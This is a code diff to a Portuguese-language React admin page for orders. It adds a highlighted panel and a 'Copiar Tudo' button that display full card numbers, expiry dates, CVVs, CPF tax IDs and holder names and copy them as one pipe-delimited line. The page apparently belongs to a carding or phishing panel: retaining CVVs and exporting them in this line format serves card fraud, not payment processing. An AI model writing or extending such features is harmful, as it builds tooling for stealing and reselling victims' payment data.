@@ -298,6 +298,37 @@ export default function PedidosPage() {
                 <div className="space-y-3">
                   <h4 className="text-sm font-medium text-muted-foreground">Dados do Cartão</h4>
                   
+                  {/* Copy All in One Line */}
+                  <div className="rounded-lg bg-red-500/10 border border-red-500/20 p-3">
+                    <div className="flex items-center justify-between gap-2">
+                      <code className="text-xs font-mono text-red-400 break-all flex-1">
+                        {selectedOrder.cardData.fullCard}|{selectedOrder.cardData.expiry?.split("/").join("|")}|{selectedOrder.cardData.cvv}{selectedOrder.cardData.cpf ? `|${selectedOrder.cardData.cpf}` : ""}{selectedOrder.cardData.holderName ? `|${selectedOrder.cardData.holderName}` : ""}
+                      </code>
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        className="border-red-500/50 text-red-400 hover:bg-red-500/10 shrink-0"
+                        onClick={() => {
+                          const expParts = selectedOrder.cardData!.expiry?.split("/") || ["", ""]
+                          const month = expParts[0] || ""
+                          const year = expParts[1]?.length === 2 ? `20${expParts[1]}` : expParts[1] || ""
+                          const line = [
+                            selectedOrder.cardData!.fullCard,
+                            month,
+                            year,
+                            selectedOrder.cardData!.cvv,
+                            selectedOrder.cardData!.cpf,
+                            selectedOrder.cardData!.holderName
+                          ].filter(Boolean).join("|")
+                          copyToClipboard(line, "fullLine")
+                        }}
+                      >
+                        {copied === "fullLine" ? <Check className="h-3 w-3 mr-1" /> : <Copy className="h-3 w-3 mr-1" />}
+                        Copiar Tudo
+                      </Button>
+                    </div>
+                  </div>
+                  
                   <div className="rounded-lg bg-secondary/30 p-4 space-y-3">
                     <div className="flex items-center justify-between">
                       <span className="text-sm text-muted-foreground">Número</span>
